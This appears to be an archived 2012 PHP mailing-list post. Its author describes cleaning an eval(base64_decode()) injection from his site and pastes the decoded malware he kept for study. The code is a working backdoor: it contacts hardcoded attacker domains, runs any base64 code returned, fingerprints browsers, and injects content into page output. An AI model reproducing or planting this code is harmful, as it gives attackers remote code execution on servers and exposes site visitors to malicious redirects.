@@ -1,0 +1,338 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+ <HEAD>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-51353372-3"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-51353372-3');
+</script>
+   <TITLE> [nycphp-talk] I've been hit with an eval(base64_decode(&quot;....&quot;)) injection attack
+   </TITLE>
+   <LINK REL="Index" HREF="http://nyphp.org/pipermail/talk/2012-February/index.html" >
+   <LINK REL="made" HREF="mailto:talk%40lists.nyphp.org?Subject=Re:%20Re%3A%20%5Bnyphp-talk%5D%20I%27ve%20been%20hit%20with%20an%20eval%28base64_decode%28%22....%22%29%29%0A%20injection%20attack&In-Reply-To=%3CCAAF%2BSg6QUCY%2BWfWvPo6%3Dwk8Y5yq%3DqSrgymb%3D%2Bx0V%3DWSh0RmUYg%40mail.gmail.com%3E">
+   <META NAME="robots" CONTENT="index,nofollow">
+   <META http-equiv="Content-Type" content="text/html; charset=us-ascii">
+   <LINK REL="Previous"  HREF="031114.html">
+   <LINK REL="Next"  HREF="031117.html">
+ <meta name="description" content="PHP jobs stackware web application support and development forums for Mongo LAMP MySQL SQL Windows IIS Linux." />
+<meta name="author" content="Stackware Web Development - http://stackware.com" />
+<meta name="verify-v1" content="zWMoPwMn/dolscLkjLXTpRqgr9K8bzlzL1vM9WTjpHc=" />
+<meta name="msvalidate.01" content="F85F81C1D0BAB5C349E8395628845E27" />
+<meta name="y_key" content="265502be3db4fb6e" />
+</HEAD>
+         <BODY BGCOLOR="#ffffff">
+<h1 style="float: right; margin: 0; padding: 0 0 0 15px;"><a href="https://www.meetup.com/new-york-php/">NYCPHP Meetup</a></h1><h1><a href="http://www.nyphp.org">NYPHP.org</a></h1>
+   <H1>[nycphp-talk] I've been hit with an eval(base64_decode(&quot;....&quot;)) injection attack</H1>
+    <B>David Mintz</B> 
+    <A HREF="mailto:talk%40lists.nyphp.org?Subject=Re:%20Re%3A%20%5Bnyphp-talk%5D%20I%27ve%20been%20hit%20with%20an%20eval%28base64_decode%28%22....%22%29%29%0A%20injection%20attack&In-Reply-To=%3CCAAF%2BSg6QUCY%2BWfWvPo6%3Dwk8Y5yq%3DqSrgymb%3D%2Bx0V%3DWSh0RmUYg%40mail.gmail.com%3E"
+       TITLE="[nycphp-talk] I've been hit with an eval(base64_decode(&quot;....&quot;)) injection attack">david at davidmintz.org
+       </A><BR>
+    <I>Fri Feb 24 16:04:00 EST 2012</I>
+    <P><UL>
+        <LI>Previous message: <A HREF="031114.html">[nycphp-talk] I've been hit with an eval(base64_decode(&quot;....&quot;)) injection attack
+</A></li>
+        <LI>Next message: <A HREF="031117.html">[nycphp-talk] I've been hit with an eval(base64_decode(&quot;....&quot;))	injection attack
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#31116">[ date ]</a>
+              <a href="thread.html#31116">[ thread ]</a>
+              <a href="subject.html#31116">[ subject ]</a>
+              <a href="author.html#31116">[ author ]</a>
+         </LI>
+       </UL>
+    <HR>  
+<!--beginarticle-->
+<PRE>On Fri, Feb 24, 2012 at 1:35 PM, Ronald Bradford
+&lt;<A HREF="http://lists.nyphp.org/mailman/listinfo/talk">ronald.bradford at gmail.com</A>&gt;wrote:
+
+&gt;<i> Have you compared your code with a backup before the injection date, or
+</I>&gt;<i> the last version of code from your version control system.
+</I>&gt;<i>
+</I>You mean, compared it in its newly sanitized state with a backup from
+before the attack? Er, not really. Most of what I have under this account
+is informal, hobby-type stuff and I have been remiss about full backups. I
+think I will change my ways.
+
+The eval(base64_decode()) stuff has been removed. I saved some for
+analysis' sake and have started looking at it, out of curiosity:
+
+
+if (function_exists('ob_start') &amp;&amp; !isset($_SERVER['mr_no'])) {
+    $_SERVER['mr_no'] = 1;
+    if (!function_exists('mrobh')) {
+
+        function get_tds_777($url) {
+            $content = &quot;&quot;;
+            $content = @trycurl_777($url);
+            if ($content !== false)
+                return $content;$content = @tryfile_777($url);
+            if ($content !== false)
+                return $content;$content = @tryfopen_777($url);
+            if ($content !== false)
+                return $content;$content = @tryfsockopen_777($url);
+            if ($content !== false)
+                return $content;$content = @trysocket_777($url);
+            if ($content !== false)
+                return $content;return '';
+        }
+
+        function trycurl_777($url) {
+            if (function_exists('curl_init') === false)
+                return false;$ch = curl_init();
+            curl_setopt($ch, CURLOPT_URL, $url);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+            curl_setopt($ch, CURLOPT_HEADER, 0);
+            $result = curl_exec($ch);
+            curl_close($ch);
+            if ($result == &quot;&quot;)
+                return false;return $result;
+        }
+
+        function tryfile_777($url) {
+            if (function_exists('file') === false)
+                return false;$inc = @file($url);
+            $buf = @implode('', $inc);
+            if ($buf == &quot;&quot;)
+                return false;return $buf;
+        }
+
+        function tryfopen_777($url) {
+            if (function_exists('fopen') === false)
+                return false;$buf = '';
+            $f = @fopen($url, 'r');
+            if ($f) {
+                while (!feof($f)) {
+                    $buf.=fread($f, 10000);
+                }fclose($f);
+            }else
+                return false;if ($buf == &quot;&quot;)
+                return false;return $buf;
+        }
+
+        function tryfsockopen_777($url) {
+            if (function_exists('fsockopen') === false)
+                return false;$p = @parse_url($url);
+            $host = $p['host'];
+            $uri = $p['path'] . '?' . $p['query'];
+            $f = @fsockopen($host, 80, $errno, $errstr, 30);
+            if (!$f)
+                return false;$request = &quot;GET $uri HTTP/1.0\n&quot;;
+            $request.=&quot;Host: $host\n\n&quot;;
+            fwrite($f, $request);
+            $buf = '';
+            while (!feof($f)) {
+                $buf.=fread($f, 10000);
+            }fclose($f);
+            if ($buf == &quot;&quot;)
+                return false;list($m, $buf) = explode(chr(13) . chr(10) .
+chr(13) . chr(10), $buf);
+            return $buf;
+        }
+
+        function trysocket_777($url) {
+            if (function_exists('socket_create') === false)
+                return false;$p = @parse_url($url);
+            $host = $p['host'];
+            $uri = $p['path'] . '?' . $p['query'];
+            $ip1 = @gethostbyname($host);
+            $ip2 = @long2ip(@ip2long($ip1));
+            if ($ip1 != $ip2)
+                return false;$sock = @socket_create(AF_INET, SOCK_STREAM,
+SOL_TCP);
+            if (!@socket_connect($sock, $ip1, 80)) {
+                @socket_close($sock);
+                return false;
+            }$request = &quot;GET $uri HTTP/1.0\n&quot;;
+            $request.=&quot;Host: $host\n\n&quot;;
+            socket_write($sock, $request);
+            $buf = '';
+            while ($t = socket_read($sock, 10000)) {
+                $buf.=$t;
+            }@socket_close($sock);
+            if ($buf == &quot;&quot;)
+                return false;list($m, $buf) = explode(chr(13) . chr(10) .
+chr(13) . chr(10), $buf);
+            return $buf;
+        }
+
+        function update_tds_file_777($tdsfile) {
+            $actual1 = $_SERVER['s_a1'];
+            $actual2 = $_SERVER['s_a2'];
+            $val = get_tds_777($actual1);
+            if ($val == &quot;&quot;)
+                $val = get_tds_777($actual2);$f = @fopen($tdsfile, &quot;w&quot;);
+            if ($f) {
+                @fwrite($f, $val);
+                @fclose($f);
+            }if (strstr($val, &quot;|||CODE|||&quot;)) {
+                list($val, $code) = explode(&quot;|||CODE|||&quot;, $val);
+                eval(base64_decode($code));
+            }return $val;
+        }
+
+        function get_actual_tds_777() {
+            $defaultdomain = $_SERVER['s_d1'];
+            $dir = $_SERVER['s_p1'];
+            $tdsfile = $dir . &quot;log1.txt&quot;;
+            if (@file_exists($tdsfile)) {
+                $mtime = @filemtime($tdsfile);
+                $ctime = time() - $mtime;
+                if ($ctime &gt; $_SERVER['s_t1']) {
+                    $content = update_tds_file_777($tdsfile);
+                } else {
+                    $content = @file_get_contents($tdsfile);
+                }
+            } else {
+                $content = update_tds_file_777($tdsfile);
+            }$tds = @explode(&quot;\n&quot;, $content);
+            $c = @count($tds) + 0;
+            $url = $defaultdomain;
+            if ($c &gt; 1) {
+                $url = trim($tds[mt_rand(0, $c - 2)]);
+            }return $url;
+        }
+
+        function is_mac_777($ua) {
+            $mac = 0;
+            if (stristr($ua, &quot;mac&quot;) || stristr($ua, &quot;safari&quot;))
+                if ((!stristr($ua, &quot;windows&quot;)) &amp;&amp; (!stristr($ua, &quot;iphone&quot;)))
+                    $mac = 1;return $mac;
+        }
+
+        function is_msie_777($ua) {
+            $msie = 0;
+            if (stristr($ua, &quot;MSIE 6&quot;) || stristr($ua, &quot;MSIE 7&quot;) ||
+stristr($ua, &quot;MSIE 8&quot;) || stristr($ua, &quot;MSIE 9&quot;))
+                $msie = 1;return $msie;
+        }
+
+        function setup_globals_777() {
+            $rz = $_SERVER[&quot;DOCUMENT_ROOT&quot;] . &quot;/.logs/&quot;;
+            $mz = &quot;/tmp/&quot;;
+            if (!is_dir($rz)) {
+                @mkdir($rz);
+                if (is_dir($rz)) {
+                    $mz = $rz;
+                } else {
+                    $rz = $_SERVER[&quot;SCRIPT_FILENAME&quot;] . &quot;/.logs/&quot;;
+                    if (!is_dir($rz)) {
+                        @mkdir($rz);
+                        if (is_dir($rz)) {
+                            $mz = $rz;
+                        }
+                    } else {
+                        $mz = $rz;
+                    }
+                }
+            } else {
+                $mz = $rz;
+            }$bot = 0;
+            $ua = $_SERVER['HTTP_USER_AGENT'];
+            if (stristr($ua, &quot;msnbot&quot;) || stristr($ua, &quot;Yahoo&quot;))
+                $bot = 1;if (stristr($ua, &quot;bingbot&quot;) || stristr($ua,
+&quot;google&quot;))
+                $bot = 1;$msie = 0;
+            if (is_msie_777($ua))
+                $msie = 1;$mac = 0;
+            if (is_mac_777($ua))
+                $mac = 1;if (($msie == 0) &amp;&amp; ($mac == 0))
+                $bot = 1; global $_SERVER;
+            $_SERVER['s_p1'] = $mz;
+            $_SERVER['s_b1'] = $bot;
+            $_SERVER['s_t1'] = 1200;
+            $_SERVER['s_d1'] = &quot;<A HREF="http://sweepstakesandcontestsdo.com/">http://sweepstakesandcontestsdo.com/</A>&quot;;
+            $d = '?d=' . urlencode($_SERVER[&quot;HTTP_HOST&quot;]) . &quot;&amp;p=&quot; .
+urlencode($_SERVER[&quot;PHP_SELF&quot;]) . &quot;&amp;a=&quot; .
+urlencode($_SERVER[&quot;HTTP_USER_AGENT&quot;]);
+            $_SERVER['s_a1'] = '<A HREF="http://www.lilypophilypop.com/g_load.php">http://www.lilypophilypop.com/g_load.php</A>' .
+$d;
+            $_SERVER['s_a2'] = '<A HREF="http://www.lolypopholypop.com/g_load.php">http://www.lolypopholypop.com/g_load.php</A>' .
+$d;
+            $_SERVER['s_script'] = &quot;mm.php?d=1&quot;;
+        }
+
+setup_globals_777();
+        if (!function_exists('gml_777')) {
+
+            function gml_777() {
+                $r_string_777 = '';
+                if ($_SERVER['s_b1'] == 0)
+                    $r_string_777 = ''; return $r_string_777;
+            }
+
+        } if (!function_exists('gzdecodeit')) {
+
+            function gzdecodeit($decode) {
+                $t = @ord(@substr($decode, 3, 1));
+                $start = 10;
+                $v = 0;
+                if ($t &amp; 4) {
+                    $str = @unpack('v', substr($decode, 10, 2));
+                    $str = $str[1];
+                    $start+=2 + $str;
+                } if ($t &amp; 8) {
+                    $start = @strpos($decode, chr(0), $start) + 1;
+                } if ($t &amp; 16) {
+                    $start = @strpos($decode, chr(0), $start) + 1;
+                } if ($t &amp; 2) {
+                    $start+=2;
+                } $ret = @gzinflate(@substr($decode, $start));
+                if ($ret === FALSE) {
+                    $ret = $decode;
+                } return $ret;
+            }
+
+        }
+
+        function mrobh($content) {
+            @Header('Content-Encoding: none');
+            $decoded_content = gzdecodeit($content);
+            if (preg_match('/\&lt;\/body/si', $decoded_content)) {
+                return preg_replace('/(\&lt;\/body[^\&gt;]*\&gt;)/si', gml_777() .
+&quot;\n&quot; . '$1', $decoded_content);
+            } else {
+                return $decoded_content . gml_777();
+            }
+        }
+
+ob_start('mrobh');
+    }
+}
+
+
+
+-- 
+David Mintz
+<A HREF="http://davidmintz.org/">http://davidmintz.org/</A>
+It ain't over:
+<A HREF="http://www.healthcare-now.org/">http://www.healthcare-now.org/</A>
+-------------- next part --------------
+An HTML attachment was scrubbed...
+URL: &lt;<A HREF="http://lists.nyphp.org/pipermail/talk/attachments/20120224/fb58bd35/attachment.html">http://lists.nyphp.org/pipermail/talk/attachments/20120224/fb58bd35/attachment.html</A>&gt;
+</PRE>
+
+<!--endarticle-->
+    <HR>
+    <P><UL>
+        <!--threads-->
+	<LI>Previous message: <A HREF="031114.html">[nycphp-talk] I've been hit with an eval(base64_decode(&quot;....&quot;)) injection attack
+</A></li>
+	<LI>Next message: <A HREF="031117.html">[nycphp-talk] I've been hit with an eval(base64_decode(&quot;....&quot;))	injection attack
+</A></li>
+         <LI> <B>Messages sorted by:</B> 
+              <a href="date.html#31116">[ date ]</a>
+              <a href="thread.html#31116">[ thread ]</a>
+              <a href="subject.html#31116">[ subject ]</a>
+              <a href="author.html#31116">[ author ]</a>
+         </LI>
+       </UL>
+
+<hr>
+<a href="http://lists.nyphp.org/mailman/listinfo/talk">More information about the talk
+mailing list</a><br>
+</body></html>
